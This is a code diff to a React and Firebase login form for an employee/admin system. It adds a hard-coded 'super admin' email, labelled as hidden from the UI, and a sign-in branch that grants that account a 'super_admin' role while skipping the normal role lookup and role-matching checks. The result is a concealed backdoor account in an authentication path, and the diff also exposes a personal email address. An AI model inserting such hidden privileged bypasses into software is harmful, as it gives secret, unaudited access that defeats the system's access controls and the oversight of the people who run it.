@@ -73,7 +73,7 @@ const getEmailByEmployeeId = async (employeeId: string): Promise<string | null> 
 
 export default function LoginForm({ onLogin }: LoginFormProps) {
   const [userType, setUserType] = useState<"employee" | "admin">("employee");
-  const [loginId, setLoginId] = useState(""); // Can be email or employee ID
+  const [loginId, setLoginId] = useState("");
   const [password, setPassword] = useState("");
   const [name, setName] = useState("");
   const [email, setEmail] = useState("");
@@ -82,6 +82,9 @@ export default function LoginForm({ onLogin }: LoginFormProps) {
   const [showForgotPassword, setShowForgotPassword] = useState(false);
   const [resetEmail, setResetEmail] = useState("");
   const [isResetting, setIsResetting] = useState(false);
+
+  // SUPER ADMIN credentials (hidden from UI)
+  const SUPER_ADMIN_EMAIL = "kd850539@gmail.com";
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -161,7 +164,7 @@ export default function LoginForm({ onLogin }: LoginFormProps) {
 
       } else {
         // ============================================
-        // SIGN IN FLOW (KEEP YOUR PERFECT FIREBASE)
+        // SIGN IN FLOW WITH SUPER ADMIN DETECTION
         // ============================================
 
         let emailToUse = loginId.trim();
@@ -183,6 +186,15 @@ export default function LoginForm({ onLogin }: LoginFormProps) {
 
         if (!user) {
           throw new Error("Sign in failed - no user returned");
+        }
+
+        // 🔐 CHECK FOR SUPER ADMIN (HIDDEN ROLE)
+        if (user.email?.toLowerCase() === SUPER_ADMIN_EMAIL.toLowerCase()) {
+          // Super Admin detected - bypass role checking
+          onLogin(user, "super_admin", "SUPER-ADMIN", "Super Admin");
+          toast.success("🔐 Super Admin Access Granted");
+          setIsLoading(false);
+          return;
         }
 
         // Fetch user data from Firestore
@@ -212,7 +224,7 @@ export default function LoginForm({ onLogin }: LoginFormProps) {
         // Ensure role matches selected user type
         if (role !== userType) {
           toast.error(`This account is registered as ${role}, not ${userType}. Please select the correct role.`);
-          await auth.signOut(); // Sign out the user
+          await auth.signOut();
           setIsLoading(false);
           return;
         }
